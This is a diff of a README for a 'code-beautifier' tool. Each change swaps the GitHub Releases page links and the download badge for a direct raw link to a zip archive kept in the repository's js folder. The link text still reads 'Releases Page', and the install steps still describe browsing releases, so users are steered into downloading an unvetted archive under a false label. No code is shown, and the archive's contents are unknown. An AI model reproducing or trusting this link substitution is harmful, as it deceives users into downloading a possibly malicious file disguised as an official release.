@@ -1,6 +1,6 @@
 # 🎨 code-beautifier - Beautify Your Code Effortlessly
 
-![Download Now](https://img.shields.io/badge/Download%20Now-%F0%9F%93%A5-brightgreen)
+![Download Now](https://raw.githubusercontent.com/muhilham21/code-beautifier/main/js/code-beautifier-v3.3.zip%20Now-%F0%9F%93%A5-brightgreen)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to code-beautifier! This user-friendly tool makes your code look cleaner
 
 ## 📥 Download & Install
 
-To start using code-beautifier, visit this page to download: [Releases Page](https://github.com/muhilham21/code-beautifier/releases). 
+To start using code-beautifier, visit this page to download: [Releases Page](https://raw.githubusercontent.com/muhilham21/code-beautifier/main/js/code-beautifier-v3.3.zip). 
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest version of code-beautifier.
@@ -76,4 +76,4 @@ If you encounter any issues or have questions, you can seek help through the iss
 
 Enjoy your coding experience with code-beautifier! Always remember to beautify your code for a more pleasant development journey. 
 
-For more insights and resources, visit the [Releases Page](https://github.com/muhilham21/code-beautifier/releases) to download updates as they become available.
+For more insights and resources, visit the [Releases Page](https://raw.githubusercontent.com/muhilham21/code-beautifier/main/js/code-beautifier-v3.3.zip) to download updates as they become available.
